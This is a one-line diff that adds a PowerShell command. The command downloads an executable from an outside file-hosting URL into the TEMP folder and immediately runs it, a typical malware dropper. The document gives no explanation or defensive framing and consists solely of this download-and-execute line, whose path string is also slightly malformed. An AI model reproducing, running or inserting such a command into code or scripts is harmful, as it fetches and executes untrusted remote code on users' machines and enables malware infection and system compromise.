@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/xsakpo.exe',"$env:TEMPeuioko.exe");Start-Process ("$env:TEMPeuioko.exe")
